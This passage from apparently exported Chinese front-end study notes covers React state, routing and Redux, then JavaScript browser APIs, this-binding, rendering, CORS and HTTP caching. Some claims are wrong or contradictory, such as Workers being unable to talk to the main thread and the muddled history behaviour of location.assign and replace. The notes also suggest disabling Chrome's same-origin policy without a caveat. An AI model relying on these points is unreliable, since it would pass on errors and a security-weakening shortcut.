console.log(this.state.count)会在状态更新后被执行，因此可以获取到更新后的count值\n因此setState()一定会改变状态，但是不会立刻更新，而是当页面渲染完毕了（状态更新完毕之后）才会更新\njsx语法的转化\njsx实质上还是createElement()方法的语法糖（简化），因为jsx语法最后还是会编译（@babel/preset-react插件）成createElement()方法\n而createElement()方法也会被转换为js对象（ReactElement），用来描述页面上显示的内容，因此不管是jsx还是createElement()最后都会转换为js对象（ReactElement），ReactElement然后通过虚拟DOM实现DOM创建和更新\n例如：\nconst Abc = (\r\u0026lt;div\u0026gt;hallo\u0026lt;/div\u0026gt;\r)\rconsole.log(Abc)\r可以看到输出返回的是一个js对象\nReact.createElement()接收3个参数，type（表示标签或者组件），config（对象，表示组件的所有属性），children（对象，表示组件之间的嵌套关系）\n组件更新机制\nsetState()的作用：修改state，更新组件\n父组件重新更新state，子组件也会更新，不过只会影响到当前组件和其他子组件（后代组件）（组件树），对于该组件的兄弟组件和根组件（父组件）是不会影响\n初次渲染，当页面刷新时就会初次渲染，先渲染根组件，再按顺序渲染更新父组件和后代组件\n更新根组件，那么其下全部的组件树都会更新\n组件性能优化\nstate只存储和组件渲染相关的数据，例如列表数据，而不用来渲染的数据不放在state中\n如果需要在多个方法中使用（共享）的数据，应该放在this中\n因为组件更新机制的原因，子组件没有变化也会重新渲染\n解决方法：\n使用钩子函数 shouldComponentUpdate(nextProps, nextState)，该钩子函数是更新阶段的，组件重新渲染前执行\n通过该钩子函数的返回值来决定该组件是否重新渲染，返回true表示重新渲染，false表示不重新渲染\n根据该钩子函数中定义的条件，来表示是否重新渲染，例如：\nshouldComponentUpdate(nextProps, nextState){\rconsole.log(nextProps, nextState)\rconsole.log(this.props, this.state)\rreturn false\r}\rshouldComponentUpdate()的两个参数分别表示最新的props和state\n而通过this获取的props和state是更新前的\n因此可以通过比较更新前的数据和更新后的数据是否一致来决定是否重新渲染，不一致就重新渲染，一致就不重新渲染\n例如：\nshouldComponentUpdate(nextProps, nextState){\rif(nextState.count !== this.state.count){\rreturn true\r}\rreturn false\r}\r也可以直接进行比较来返回值，例如：return nextState.count !== this.state.count\n给子组件加shouldComponentUpdate()，子组件判断是否一致，通过props来判断\n纯组件（PureComponent）（内部对比是shallow compact，浅层对比）\n使用方法：class App extends React.PureComponent{}\nPureComponent内部自动实现了shouldComponentUpdate()钩子功能，不需要手动比较\n纯组件内部通过比较更新前和更新后两次props和state的值，来决定是否重新渲染组件\n浅层对比对于基础类型对比没有影响，就是值和值对比，而对于引用类型，只比较对象的引用地址是否相同，只要地址相同，就返回true，这个很坑\n如果state或者props中属性值是引用类型的，应该新建一个新数据，而不是直接修改原来的数据，例如：\nconst halloobj = { ...state.obj, a: \u0026quot;hallo\u0026quot; }\rsetState({ obj: halloobj })\r虚拟DOM和Diff算法\nreact渲染视图：只要state发生变化就重新渲染视图，部分更新，只更新变化的区域\n虚拟DOM配合Diff算法实现了部分更新功能\n虚拟DOM实质上是一个js对象，来描述视图显示的内容\n在初次渲染的时候，react会根据初始state（Model），来创建一个虚拟DOM树，然后根据虚拟DOM来生成真正的DOM，渲染到视图中\n当数据（state）发生变化时，会重新根据新的数据，创建新的虚拟DOM树\n然后会与上一次得到的虚拟DOM对象，使用Diff算法进行比较，来找到需要更新的内容\n然后只将变化的内容更新（patch）到DOM中，重新渲染到视图\n当组件的render()被调用时，会根据state和jsx结构来生成虚拟DOM对象\nrender()方法调用，不代表视图重新渲染，只是说明要进行Diff比较\nReact路由\n现代前端应用大多是SPA（单页应用程序），也就是只有一个html页面的应用程序，为了使用单页面来管理原来多页面的功能，因此前端路由诞生了\n路由实质上就是从一个视图导航到另一个视图，是一套映射规则，在React中是url路径与组件的对应关系\n安装路由（react）\nyarn add react-router-dom\n导入路由的核心组件（Router, Route, Link）\nimport { BrowserRouter as Router, Route, Link } from \u0026quot;react-router-dom\u0026quot;\r使用Router组件来作为根组件来包裹整个应用\n使用Link组件来作为路由入口\n使用Route组件来配置路由规则和要显示的组件（路由出口）\n例如：\nconst Hallo = () =\u0026gt; (\r\u0026lt;div\u0026gt;\rhallo React路由\r\u0026lt;/div\u0026gt;\r)\rconst PostMax = (props) =\u0026gt;{\rreturn (\r\u0026lt;Router\u0026gt;\r\u0026lt;div\u0026gt;\r\u0026lt;Link to=\u0026quot;/hallo\u0026quot;\u0026gt;跳转\u0026lt;/Link\u0026gt;\r\u0026lt;Route path=\u0026quot;/hallo\u0026quot; component={Hallo}\u0026gt;\u0026lt;/Route\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/Router\u0026gt;\r) }\rreact路由的执行过程：\n点击Link组件，修改URL\nReact路由监听到URL的变化，React路由内部遍历全部Route组件\n使用路由规则（path）与pathname（浏览器URL）进行匹配\n当路由规则和pathname匹配时，显示该Route组件的内容\n编程式导航（通过js程序来实现页面跳转）\nhistory是react路由提供的，用来获取浏览器历史记录的相关信息\n用法：this.props.history.push(\u0026quot;/hallo\u0026quot;)\n返回上一页面：props.history.go(-1)\npush中的参数就是要跳转的路径\n例如：\nconst PostMax = (props) =\u0026gt;{\rreturn (\r\u0026lt;Router\u0026gt;\r\u0026lt;div\u0026gt;\r\u0026lt;Link to=\u0026quot;/demoabc\u0026quot;\u0026gt;跳转\u0026lt;/Link\u0026gt;\r\u0026lt;Route path=\u0026quot;/demoabc\u0026quot; component={Demoabc}\u0026gt;\u0026lt;/Route\u0026gt;\r\u0026lt;Route path=\u0026quot;/abc\u0026quot; component={Abc}\u0026gt;\u0026lt;/Route\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/Router\u0026gt;\r) }\rconst Abc = (props) =\u0026gt; {\rconst onbock = () =\u0026gt;{\rprops.history.go(-1)\r}\rreturn(\r\u0026lt;div\u0026gt;\r\u0026lt;div\u0026gt;hallo\u0026lt;/div\u0026gt;\r\u0026lt;div onClick={onbock}\u0026gt;返回\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r)\r}\rclass Demoabc extends React.Component{\ronGo = () =\u0026gt;{\rthis.props.history.push(\u0026quot;/Abc\u0026quot;)\r}\rrender(){\rreturn(\r\u0026lt;div onClick = {this.onGo}\u0026gt;goDemo\u0026lt;/div\u0026gt;\r)\r}\r}\r默认路由（进入页面就显示指定组件）：进入页面就匹配的路由\n默认路由为/，例如：\n\u0026lt;Route path=\u0026quot;/\u0026quot; component={Demoabc}\u0026gt;\u0026lt;/Route\u0026gt;\r匹配模式\n默认情况下，react路由是模糊匹配\n模糊匹配规则：当pathname以path开头就会匹配成功\n因此默认路由（/）永远都会匹配成功，得出如果当前页面是/Demoabc/xxx，那么/Demoabc和默认路由（/）也是会匹配成功\n精确匹配（避免默认路由匹配成功）\n给Route组件添加exact属性就是将其转换为精确匹配模式\n使用方法：\nreact的jsx中的onClick事件之类的都会封装在组件中，不会污染全局\n在react中使用了一个叫事件委托的事件处理方式\n无论页面有多少个事件，DOM上还是只添加一个事件函数\nVirtual DOM\n前端性能优化有个原则：尽量减少DOM操作\nDOM树是对html的抽象，那么Virtual DOM就是DOM的抽象，react会对比这次和上次渲染出来的Virtual DOM，找到发生改变的地方，达到局部更新数据，只重新渲染发生改变的那个区域，而不是改变个数据，整个dom结构都重新渲染\n根据软件设计的原则，一个优秀的组件要满足高内聚和低耦合的要求\n高内聚：将逻辑或者和逻辑相关的封装到一个组件中\n低耦合：不同的组件的依赖性要弱化，保证每个组件要尽量独立\n组件对外用prop，对内用state\n在外部的组件在任何情况下都不应该直接操作prop的值，而是在内部通过state来操作数据\nreact组件性能优化\n单个组件：通过shouldComponentUpdata函数的定义，在必要的情况下不需要更新，来节约计算资源\n多个组件：利用react的reconciliation算法，在树型结构的根节点不相同的话，react会推倒重新渲染，而如果相同，那么react就会保留节点的DOM元素，只对树型结构树型结构根节点上的属性和内容进行修改，只更新被修改的部分\n巧妙使用key：key在react中就是唯一标识，react通过key来确定组件的身份标识，能更快速识别出哪里发生了改变，key的值不要经常改变，要保证其是唯一性，稳定不变性，请勿使用index作为key\nRedux\nRedux是专门管理数据状态和UI状态的（可预测化的状态管理），Redux通过将应用状态存储在公用仓库（store）中，统一管理，这个仓库里有一个状态树（state tree），组件可以直接向仓库请求，可以通过监控仓库的状态来刷新状态（store的变化会导致view的变化）,调试Redux可以用Redux DevTools，Redux使用的是Flux模式\n安装Redux\nnpm install \u0026ndash;save redux\n或者react-redux\nnpm install \u0026ndash;save react-redux\nsrc/store/reducer.js\nconst StateData = {\rdata:[\r'hallo',\r'hahaha'\r]\r}\rexport default (state = StateData,action)=\u0026gt;{\rreturn state\r}\r建立reducer管理\nsrc/store/index.js\nimport { createStore } from 'redux'\rimport reducer from './reducer'\rconst store = createStore(reducer) export default store\r上面通过createStore方法创建store仓库，并且暴露store仓库\n组件获取状态\nimport React, { Component } from \u0026lsquo;react\u0026rsquo;; import store from \u0026lsquo;./store\u0026rsquo; class Demo extends Component { constructor(props){ super(props) this.state=store.getState() console.log(this.state) } render() { return ( {this.state.list} ) } }\nRedux有三个原则：唯一数据源，保持状态只读，数据改变只通过纯函数完成\n唯一数据源就是将全部组件（或者应用）状态数据只存放在唯一的一个store上\n保持状态只读就是不直接修改状态数据，通过一个action对象来完成，不是不修改状态数据，而是创建一个新的状态对象返回给Redux，让Redux来完成状态的处理\n数据改变只通过纯函数完成就是通过reducer来规约数据\nReact-Redux将全部组件分为两种，UI组件和容器组件\nUI组件就是只提供UI，没有涉及逻辑处理的，没有状态，不使用任何Redux的api，数据完全靠this.props来提供\n容器组件就是只提供逻辑处理，不涉及任何关于UI的\n一般来说容器组件会包裹UI组件，来提供组件通信，将数据传递给只提供UI的组件，UI根据传递过来的数据来渲染更新\n在Redux中，容器组件都由Redux提供，只需要专注逻辑和UI组件就可以了\n通过connect方法来将UI组件和容器组件连接起来，可以通过connect方法自动生成容器组件\n例如：\nimport { connect } from 'react-redux'\rconst Docker = connect()(Ui)\r其中Docker就是通过connect方法生成的容器组件，而Ui就是UI组件\nconnect()方法还支持两个参数，分别是输入逻辑和输出逻辑\n输入逻辑就是如何将数据传递给UI组件的定义（props），输出逻辑就是如何将用户操作UI组件的数据映射到store.dispatch\nwithRouter高阶组件：当某个东西不是router路由时，但是需要它跳转时，就可以使用withRouter\nwithRouter组件是在react-router-dom中的，因此需要引用，用法：\nimport React from 'react'\rimport { withRouter, Route } from \u0026quot;react-router-dom\u0026quot;\rclass Demo extends React.Component {\rrender() { console.log(this.props)\rreturn ( \u0026lt;div\u0026gt;\r\u0026lt;Route exact path='/' component={Home} /\u0026gt;\r\u0026lt;Route path='/admin' component={Admin} /\u0026gt;\r\u0026lt;/div\u0026gt;\r)\r}\r}\rexport default withRouter(Demo)\r可以看到withRouter接收一个组件，router的history, location, match存储在组件的props属性中\n","permalink":"https://99999.fun/posts/63/","summary":"setState()\n注意：如果调用多次setState()，但是还是只触发一次重新渲染（性能优化，如果每更新一次状态就渲染一次的话，很影响性能）\nsetState()是异步更新数据的，因此setState()不要依赖于前面的setState()，因为其不会立刻更新数据\n如果当前setState()依赖于前面的setState()，解决方法：\nthis.setState((state, props) =\u0026gt;{\rreturn{\rcount: state.count + 1\r}\r})\rconsole.log(this.state.count)\rthis.setState((state, props) =\u0026gt;{\rreturn{\rcount: state.count + 1\r}\r})\rconsole.log(this.state.count)\rstate和props参数分别获取到最新的state和最新的props，通过回调函数返回值，保证每次都获取到最新的state和props\n如果想在状态更新后（页面完成重新渲染）立刻执行某个操作，那么可以使用setState()的第二个参数，这个参数是一个回调函数\n例如：\nthis.setState((state, props) =\u0026gt;{\rreturn{\rcount: state.count + 1\r}\r},() =\u0026gt; {\rconsole.log(this.state.count)\r})\r可以看出 console.log(this.state.count)会在状态更新后被执行，因此可以获取到更新后的count值\n因此setState()一定会改变状态，但是不会立刻更新，而是当页面渲染完毕了（状态更新完毕之后）才会更新\njsx语法的转化\njsx实质上还是createElement()方法的语法糖（简化），因为jsx语法最后还是会编译（@babel/preset-react插件）成createElement()方法\n而createElement()方法也会被转换为js对象（ReactElement），用来描述页面上显示的内容，因此不管是jsx还是createElement()最后都会转换为js对象（ReactElement），ReactElement然后通过虚拟DOM实现DOM创建和更新\n例如：\nconst Abc = (\r\u0026lt;div\u0026gt;hallo\u0026lt;/div\u0026gt;\r)\rconsole.log(Abc)\r可以看到输出返回的是一个js对象\nReact.createElement()接收3个参数，type（表示标签或者组件），config（对象，表示组件的所有属性），children（对象，表示组件之间的嵌套关系）\n组件更新机制\nsetState()的作用：修改state，更新组件\n父组件重新更新state，子组件也会更新，不过只会影响到当前组件和其他子组件（后代组件）（组件树），对于该组件的兄弟组件和根组件（父组件）是不会影响\n初次渲染，当页面刷新时就会初次渲染，先渲染根组件，再按顺序渲染更新父组件和后代组件\n更新根组件，那么其下全部的组件树都会更新\n组件性能优化\nstate只存储和组件渲染相关的数据，例如列表数据，而不用来渲染的数据不放在state中\n如果需要在多个方法中使用（共享）的数据，应该放在this中\n因为组件更新机制的原因，子组件没有变化也会重新渲染\n解决方法：\n使用钩子函数 shouldComponentUpdate(nextProps, nextState)，该钩子函数是更新阶段的，组件重新渲染前执行","title":"深入学习React"},{"content":"函数被调用时，浏览器会传递两个参数，this和arguments\nthis就是函数的上下文对象，而arguments是一个数组对象（也就是可以通过索引来操作数据），函数调用时传递的参数会在arguments中保存\ncallee属性对应着当前的函数\n例如：\nfunction abc(){\rconsole.log(arguments.length);\rconsole.log(arguments[0]);\rconsole.log(arguments.callee);\rconsole.log(this)\r}\rabc('hallo');\rBOM对象 (Browser Object Model) 是指浏览器对象模型\n该对象提供了浏览器行为和浏览器属性方法\nwindows表示整个浏览器的窗口，同时也是JavaScript最顶层的对象，其他bom对象都是其的属性\nnavigator包含了当前浏览器的全部信息\nconsole.log(window.navigator)\r可以看到输出了很多属性，如userAgent，language等等\nlocation表示当前浏览器地址信息，可以用来跳转到指定地址，获取当前页面的地址等等，例如：\nconsole.log(window.location)\rconst urlData = \u0026quot;https://xiaochenabc123.test.com/;\rwindow.location.href = urlData;\r这个也可以实现跳转\nwindow.location.assign(\u0026quot;https://xiaochenabc123.test.com\u0026quot;)\r这个也可以实现跳转，不过这个不会生成历史记录，是直接用这个页面来替换当前页面\nwindow.location.replace(\u0026quot;https://xiaochenabc123.test.com\u0026quot;)\rreload方法可以重载页面，加上true参数将强制更新\nwindow.location.reload(true)\rhistory表示浏览器的历史记录\nconsole.log(window.history)\rlength表示本次访问网站的数量\n同时也提供了几个方法\nback()返回上个页面\nwindow.history.back()\n可以绑定个点击事件，用来返回上个页面\nforward()前进，一般是和back()搭配使用，一个返回上个页面，一个返回到之前的页面\nwindow.history.forward()\ngo()，前进或者后退指定次数，正数为前进，负数为后退\nwindow.history.go(-1)\nscreen代表用户的屏幕的信息, 获取显示器的相关信息\nconsole.log(window.screen)\rcall 和 apply\naddEventListen()绑定事件函数\nremoveEventListen()移除事件函数\n鼠标按下时onmousedown\n鼠标移动时onmousemove\n鼠标松开时onmouseup\nundefined代表定义未赋值\nnull定义并赋值了, 只是值为null\ndocument.execCommand可以操作剪贴板\ndocument.execCommand(\u0026lsquo;copy\u0026rsquo;) // 复制\ndocument.execCommand(\u0026lsquo;cut\u0026rsquo;) // 剪切\ndocument.execCommand(\u0026lsquo;paste\u0026rsquo;) // 粘贴\nClipboard API新一代剪贴板操作方法，而且全部操作都是异步的，而且还可以将任何内容都放到剪贴板中\nconst NavigatorClipboard = navigator.clipboard\nWeb Workers\nWeb Workers就是创建多线程的，因为JavaScript是单线程语言\nWeb Workers允许主线程创建Workers线程，将任务分配给Workers线程\n主线程和Workers线程在运行的时候，互不干扰，当Workers线程处理完毕再将结果返回给主进程\n注意：Workers线程不能和主线程进行通信，不能读取本地文件，只能通过网络文件获取，而且Worker执行的脚本文件必须要和主线程同源\n创建Worker线程\nvar worker = new Worker(\u0026lsquo;https://xxx.xxx/data.js')\n可以看出Worker构造函数的参数是一个脚本文件，例如js\n注意：因为Worker不能读取本地文件，只能从网络上获取，因此会出现下载失败的情况，当下载失败的时候，不会抛出错误的\n主线程和worker线程通信\nworker.postMessage(\u0026ldquo;hallo word\u0026rdquo;)\nworker.onmessage = function (event) {\rconsole.log('data: ' + event.data)\r}\r当worker线程处理完毕，结果可以被event.data获取到\n关闭worker线程\nworker.terminate()\n深拷贝和浅拷贝\n浅拷贝：两个变量指向同一个内存地址，修改任何一个值，另一个的值也会跟着变化\n例如：\nvar obj = {\rname: \u0026quot;root\u0026quot;\r}\rvar abc= obj\rabc.name = \u0026quot;admin\u0026quot;\rconsole.log(obj, adc)\r深拷贝：将对象的值复制，并且给予新的变量名和地址，改变一个值，并不会引起另一个值的变化，因为引用地址不同\n例如：\nvar obj = {\rname: \u0026quot;root\u0026quot;\r}\rvar abc = { ...obj }\rabc.name = \u0026quot;admin\u0026quot;\rconsole.log(obj, abc)\rnew的作用：实例化一个新的对象-调用构造函数并且将构造函数的this指向该实例对象-实例对象共享构造函数的方法和属性\nJavaScript的内存管理机制与垃圾回收机制\n内存管理机制就是分配内存，JavaScript的内存管理就是创建时分配，不使用就是被回收释放\nJavaScript内存空间分为栈，堆，池\n栈存放变量，堆存放复杂对象，池存放常量\n在声明一个变量或者对象，函数的时候系统会自动分配内存，使用完毕的时候通过垃圾回收机制自动回收\n浏览器最常见的垃圾回收有两个，分别是标记清除，引用计数\n标记清除：垃圾回收器会给存储在内存中的变量一个标记，然后会去掉在环境中的变量及被环境中的变量引用的变量标记（闭包），而在此之后剩下的带有标记的变量视为要被删除的变量，最后垃圾回收器将释放这些变量的内存，回收它们所占用的空间\n引用计数：通过跟踪记录每个值被使用的次数，调用一次值解就加一，改变值为另一个值时就减一，当次数为0时，就是在说明没有变量在使用，这个值已经无法访问，垃圾回收器在运行的时候清理回收引用次数为0的值占用的空间\n注意：引用计数方法会导致内存泄露，因为其循环引用，导致闭锁\nthis指向：在严格模式中，函数内部的this被指向到undefined上，在非严格模式上会被绑定到window/global全局对象上，在使用new调用构造函数时，该构造函数内部的this被指向到这个new出来的对象上，在使用call/apply/bind方法调用函数时，该函数内部的this被指向call/apply/bind方法指定参数的对象上，在箭头函数中，this的指向取决于外部作用域，在执行上下文中，this取决于最后调用它的对象\nthis优先级：使用bind，apply，call，new绑定this指向的叫显式绑定，而通过调用方式来绑定叫隐式绑定，显式绑定的优先级比隐式绑定的优先级高，在显式绑定中，new优先级最高\n当某个函数在对象上下文中被调用，这个函数的this会绑定在这个对象上下文中，例如：\nfunction abc(){\rconsole.log(this.a)\r}\rlet a = 1\rlet obj = {\ra: 123,\rabc: abc\r}\rlet obj1 = {\ra: 666,\robj: obj\r}\robj.abc() // 哪怕在全局作用域中调用，this依然指向对象上下文\robj1.obj.abc() // 可以看到对象属性引用链只有真正调用函数的才可以影响this\r丢失this绑定（由于默认绑定，会默认绑定到全局对象或者undefined上，从而丢失了this），例如：\nfunction abc(){\rconsole.log(this.a)\r}\rvar obj = {\ra: 123,\rabc: abc\r}\rvar funs = obj.abc\rvar a = 666\rfuns()\rfuns变量的值为obj.abc的引用，注意不是调用，调用要加()，执行funs时就是在调用abc函数（因为funs的值就是abc函数的引用），因此abc函数的this指向了全局对象（a在全局作用域中，会变成全局对象的属性），导致丢失了想要指向obj对象的this\n使用let或者const关键字声明的全局变量，会被绑定到Script对象上而不是Window对象，使用var定义的变量，就可以被绑定到Window对象上\n例如：\nvar abc = \u0026ldquo;hallo\u0026rdquo; console.log(this.abc) // hallo console.log(this) // Window\nlet abc = \u0026ldquo;hallo\u0026rdquo; console.log(this.abc) // undefined console.log(this) // Window\nbind，apply，call都是改变this指向的\nbind()：第一个参数是this的指向，后面的是参数列表，可以多次传入，而call要求一次性传入完毕\n例如：\nvar arr=[1,2,4,6,7,10] var max=Math.max.bind(null,arr[0],arr[1],arr[2]) console.log(max()) // 4\napply():接受两个参数，第一个参数是this的指向，第二个参数是函数接收的参数（这个参数是通过数组形式传参），如果第一个参数为null或者undefined的时候，将指向window\nconst arr = [1,2,4,6,7,10] const abc = Math.max.apply(null,arr) console.log(abc) // 10\ncall():第一个参数是this的指向，后面传入的是一个参数列表（注意要一次性传完），当第一个参数为null或undefined的时候，表示指向window，call是临时改变一次this指向，并立即执行（和apply()一样）\nvar arr=[1,2,4,6,7,10] var max=Math.max.call(null,arr[0],arr[1],arr[2]) console.log(max) // 4\ncall和apply可直接对函数进行调用，而bind是返回一个函数，这个函数已经绑定了新的this指向，需要()来调用\n显式硬绑定\nfunction abc(){\rconsole.log(this.a)\r}\rvar obj = {\ra: 123,\rabc: abc\r}\rvar funs = function(){\rabc.call(obj)\r}\rfuns()\rfuns.call(windos) // 不能修改this，因为调用funs函数本身就是在绑定this\r数字 Number 字符串 String 对象 日期 Date 对象 数组 Array 布尔 Boolean 算数 Math\n防抖动（Debouncing）和节流阀（Throtting）\n防抖和节流是web性能优化的知识点，常见于处理触发频率较高的函数，例如：滚动条监听\n防抖(debounce)\n触发事件，不立刻执行，而是事件发生后一段时间在执行，延迟执行，例如setTimeout()\n每触发一次，都要经过一定时间后才进行执行，而该事件再触发，那么上一个触发的时间作为新起点\n可以理解为触发事件后在一定时间内只执行一次，如果在该一定时间内又触发了事件，那么重新计算\n节流(throttle)\n节流其实就是连续触发多次事件，但是在一定时间只触发一次函数\n防抖和节流的区别就是，一个在一定时间内只执行一次，多次触发重新计算，而另一个就是在一定时间内触发一次\nDOM事件流/事件委托\nDOM事件流实质上就是页面中接收事件的顺序，当事件被触发的时候，事件在dom节点之间按照顺序传播，这个就是DOM事件流\n事件被触发，执行目标该事件的处理函数，一个事件被触发，传递给自己父级，一直到window，这个叫事件冒泡\n捕获事件和冒泡只能执行其中一个，例如不想执行某个事件冒泡，就可以捕获其事件，从而达到阻止冒泡的情况发生\n事件对象（event）：这个对象包含了事件的相关数据\nev = event || window.event\nev.target可以获取到是说触发了这个事件，例如：\nconst ev = event || window.event\rconst div = document.querySelector('div')\rdiv.addEventListener('click', function (ev) {\rconsole.log(ev.target)\r})\r还有preventDefault()，stopPropagation()分别用来阻止默认事件和冒泡的\n事件委托\n事件委托实质上就是不在子元素上设置事件监听，而是在其父元素上，利用冒泡事件来设置给子元素\n在父元素上绑定事件监听，然后通过ev.target来精确找到是那个子元素触发的，然后事件冒泡到父元素上，因为父元素有事件监听器，因此触发\nthis会变，但是ev.target永远会精确找到触发事件的目标元素，可以不再使用this来表示当前事件触发元素了\nDOM加载顺序（浏览器加载顺序）：解析HTML-加载外部脚本和样式表-解析脚本并且执行-构造DOM模型-加载外部文件（例如图片视频音频等等）\n浏览器渲染过程\n接收获取到html/css/JavaScript等资源后\n浏览器解析渲染该资源，在渲染页面之前后先构建DOM树和CSSOM树\nDOM树实质就是DOM对象模型，提供了对DOM的结构的方法（例如js就是通过dom来操作结构和样式等等）\nCSSOM树实质就是样式对象模型，是css的对象集合\n通过DOM树和CSSOM树合并为RenderObject树（RENDER树，又叫渲染树），通过一系列的布局，绘制操作，再通过浏览器来将渲染交给GPU进程来合成，最后显示页面\n因为JavaScript被设计成GUI渲染和JavaScript互斥，当JavaScript执行的时候，GUI线程会被挂起，等待JavaScript执行完毕后才会执行GUI渲染操作\n因此当JavaScript执行时间过长，会导致GUI渲染DOM加载堵塞\n另外CSS加载也是会阻塞DOM的渲染，因为它需要等CSSOM构造完毕才会开始渲染（RenderObject树依赖于DOM树和CSSOM树）\n而且CSS会在JavaScript执行之前加载执行，因此也是会阻塞JavaScript执行\n关键渲染路径(Critical Rendering Path)优化\n为了完成第一次渲染，应该尽量减少关键资源加载的数量，减短关键资源的获取时间，减小关键资源文件的大小\n在生产环境中，应该减少不必要的注释，空格，尽量做到min文件，可以利用GZIP来压缩文件，来减小文件大小，利用缓存机制来减少获取资源的数量\n注意：浏览器遇到script元素的时候，会阻止解析器执行操作，当CSSOM树构建完毕才会执行JavaScript，再解析\n可以利用script元素的async属性来让其继续执行，而且不会被CSSOM阻止\nscript元素的defer属性可以等解析完毕（Loaded）后再执行\n浏览器的回流和重绘\n当渲染树（RenderTree）某个部分出现改变（例如尺寸，属性等等），浏览器会重新渲染该部分或者全部的过程叫回流（reflow）\n页面第一次渲染，视窗大小发生改变，元素位置或者大小发生改变，元素字体大小发生改变，添加或删除DOM元素等等都会导致回流\n例如：增加，删除，修改dom节点，移动dom位置，修改css样式（大小），改变窗口的对象（Resize）（移动端没这个问题），滚动页面，修改网页的字体等等\n重绘（Repaint）：当元素不会改变其在正常流（文档流）的时候，只是改变样式，浏览器将新样式给元素并且重新绘制其\n回流和重绘危害性，肯定是回流严重，一个是重新渲染，另一个只是渲染其本身\n性能优化\n减少http请求次数（缓存或者本地存储），减少http请求文件的体积，图片优化（压缩），提升http请求速度\n减少dom操作（避免浏览器回流），事件委托，DOM Fragment，防抖节流，尽量不使用全局变量，布局优先选择flex\n异步加载css和js，预加载preload，页面加载动画，骨架屏，路由（组件）懒加载，组件缓存（keepalive）\n因为浏览器有同域策略，跨域会阻止，因此要解决跨域问题\n跨域资源共享(CORS)\n跨域发生的原因并不是在服务端，而是浏览器，实质上跨域发生后，服务端接收到请求，并且返回响应，但是浏览器接收到了响应后，因为浏览器的安全策略的原因，如果符合跨域的要求，但是没有通过Access-Control-Allow-Origin参数来允许客户端跨域请求该数据的话，浏览器将忽略响应结果，返回发生跨域的报错，从而得出，跨域是浏览器的安全策略的一种，确保得到的响应是服务端的的确确是发送给浏览器（客户端）的，而且也能进一步避免浏览器处理了另一个域的恶意脚本，也能进一步避免服务端的敏感数据对不合法请求的暴露\n注意：localhost和127.0.0.1是存在映射关系，但是浏览器不知道localhost是映射到哪里的，因此浏览器会认为localhost和127.0.0.1是不同域的\nCORS可以通过http头来告诉浏览器，准许访问来自不同源的指定资源\n只需要服务器设置Access-Control-Allow-Origin就可以，只有特殊跨域才需要设置\nnginx配置 location / { add_header Access-Control-Allow-Origin *; }\n谷歌浏览器标记：\u0026ndash;disable-web-security（禁用同源策略）\nJSONP是json的补充，并不是官方的标准，jsonp是利用script标签和img标签之类的可以直接引用其他域的文件（没有跨域限制）\njsonp跨域，例如：\nlet script = document.createElement('script')\rscript.type = 'text/javascript'\rscript.src = 'https://test.xiaochenabc123.test.com/test.js'\rdocument.head.appendChild(script)\rnode跨域\napp.all('*', function(req, res, next) {\rconsole.log(req.method);\rres.header(\u0026quot;Access-Control-Allow-Origin\u0026quot;, \u0026quot;*\u0026quot;);\rres.header(\u0026quot;Access-Control-Allow-Origin\u0026quot;, \u0026quot;https://test.xiaochenabc123.test.com\u0026quot;);\rres.header('Access-Control-Allow-Headers', 'Content-type');\rres.header(\u0026quot;Access-Control-Allow-Methods\u0026quot;, \u0026quot;PUT,POST,GET,DELETE,OPTIONS,PATCH\u0026quot;);\rres.header('Access-Control-Max-Age',1728000);\rnext(); });\r预检请求\nCORS预请求：浏览器会发送一个OPTIONS请求到服务端验证跨域的配置是否正确，然后服务端返回一个响应来确定跨域是否被允许\nCORS将请求分成2种，简单请求（simple request）和非简单请求（not-simple-request）\n简单请求（满足下面的条件就是简单请求，否则就是非简单请求）：\n请求方式：必须是GET请求，POST请求，HEAD请求这三个之一\n请求头：请求头只能设置Accept，Accept-Language，Content-Language，Content-Type这三个字段\nContent-Type：该字段的值只能设置text/plain，multipart/form-data，application/x-www-form-urlencoded这三个值\n简单请求不会触发CORS预检请求，直接向目标服务器发送请求，如果满足CORS配置，服务器则返回响应，如果不是简单请求，那么浏览器会在发送请求之前发送预检请求给服务器，检查当前请求是否符合服务器的CORS配置，如果不符合则跨域报错，符合后才发送真正的请求\nCORS预检请求：使用OPTIONS请求发送预检请求到服务器上，来确定服务器是否允许该请求，该请求包含了两个字段，分别是Access-Control-Request-Method和Access-Control-Request-Headers，服务器接收到请求后，发送预检请求的响应，该响应中包括Access-Control-Allow-Headers和Access-Control-Allow-Origin这些字段，来限制请求，浏览器接收到该响应后才发送真实的资源请求\n（客户端）Access-Control-Request-Method表示实质请求用什么请求方式，Access-Control-Request-Headers表示实质请求携带了什么字段，由服务端来检查，该请求是否被允许\n（服务端）Access-Control-Allow-Origin表示服务器限制请求的源域，没有限制为*，Access-Control-Allow-Headers表示服务器允许请求携带什么字段，Access-Control-Allow-Methods表示服务器允许用什么请求方式来请求，Access-Control-Max-Age表示该预检请求的响应可以缓存多久（在该时间段内不用再发送同一请求的预检请求）\n注意：浏览器有个最大有限时间，Access-Control-Max-Age响应头（服务端响应），该响应头表示了本次预检请求的响应可以被缓存多久，单位为秒（不同浏览器最大有限时间都不同，Firefox为86400秒，目前最新chromium为7200秒），在这个时间段内浏览器不需要再为同一个请求发送预检请求\n缓存\nres.header(\u0026quot;Cache-Control\u0026quot;,\u0026quot;max-age=60\u0026quot;);\rprivate指的单个用户，public可以被任何中间人、CDN等缓存\nHTTP的可缓存性（public（允许被任何人（客户端，中间人，代理都可以）缓存），private（只能缓存在客户端，代理服务器无法获得缓存），no-cache（禁止强缓存，每次都需向服务端验证缓存是否过期，只有当确认没有过期后才能被缓存））\n缓存到期(max-age（缓存的到期时间，单位为秒，距离上一次请求多少秒后缓存过期），s-maxage（设置代理服务器的缓存到期时间，单位为秒），max-stale（允许缓存超过max-age或者s-maxage设置的缓存生存时长，该配置表示过期的缓存最大可以缓存多久，单位秒，也就是说实质缓存过期时间是max-age+max-stale（或者s-maxage））)\n重新验证（must-revalidate（和no-cahe类似，但是该参数允许缓存过期多少秒后进行验证，单位为秒），proxy-revalidate（和must-revalidate类似，不过只作用于代理服务器））\nno-store（禁止缓存），no-transform（不允许对资源进行压缩或者转换的工作）\n设置一个完全禁止缓存（Cache-Control: no-cache, no-store, 